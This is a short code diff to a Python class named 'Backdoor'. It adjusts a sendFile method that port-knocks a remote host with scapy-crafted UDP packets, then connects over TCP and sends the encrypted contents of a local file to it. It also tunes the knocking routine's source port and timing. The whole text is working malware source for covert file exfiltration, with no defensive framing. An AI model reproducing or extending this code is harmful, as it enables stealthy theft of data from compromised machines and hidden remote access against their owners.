@@ -88,12 +88,12 @@ class Backdoor(object):
     def sendFile(self, filename):
         knocker = self.portKnocking(self.knockList)
 
-        time.sleep(1)
+        time.sleep(3)
 
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((self.remoteIP, self.listenPort))
 
-        encryptedString = encrypt.encryptedFile(filename)
+        encryptedString = encryption.encryptFile(filename)
 
         sock.sendall(encryptedString)
         sock.send(b'EOF')
@@ -101,8 +101,9 @@ class Backdoor(object):
     def portKnocking(self, knockList):
         for port in knockList:
             print(port)
-            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(dport=int(port))
+            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(sport=self.localPort, dport=int(port))
             send(pkt, verbose=False)
+            time.sleep(0.1)
 
     def is_incoming(self, packet):
         """
